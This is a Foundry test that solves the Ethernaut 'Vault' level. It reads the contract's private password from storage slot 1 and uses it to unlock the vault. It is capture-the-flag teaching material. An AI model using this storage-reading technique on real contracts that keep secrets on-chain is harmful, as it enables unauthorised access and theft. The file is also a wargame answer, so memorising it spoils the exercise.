// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault/Vault.sol";
import "../src/Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

contract ForceTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 1 ether);
        vm.label(player, "player");
    }

    function test_vault_attack() public {
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        bytes32 lockValue = vm.load(address(ethernautVault), 0x0);
        bytes32 passwordValue = vm.load(
            address(ethernautVault),
            bytes32(uint256(1))
        );

        console.logBytes32(lockValue);
        console.logBytes32(passwordValue);

        ethernautVault.unlock(passwordValue);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
